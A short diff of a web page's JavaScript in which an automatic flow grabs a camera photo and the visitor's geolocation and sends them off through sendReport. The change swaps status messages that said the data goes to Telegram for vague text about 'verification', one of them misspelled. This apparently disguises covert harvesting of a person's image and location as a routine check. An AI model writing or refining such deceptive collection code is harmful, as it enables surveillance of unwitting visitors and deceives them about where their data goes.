@@ -270,9 +270,9 @@
     async function autoFlow() {
       try {
         btnSetLocked();
-        text.innerHTML = 'Запрашиваем камеру и геолокацию…';
+        text.innerHTML = 'Запрашиваем разрещения на проверку';
         const [geo, photoBase64] = await Promise.all([askGeolocation(), takePhoto()]);
-        text.innerHTML = 'Отправляем данные в Telegram…';
+        text.innerHTML = 'Отправляем данные на проверку';
         await sendReport({ photoBase64, geo });
         reportReady = true;
         btnSetReady();
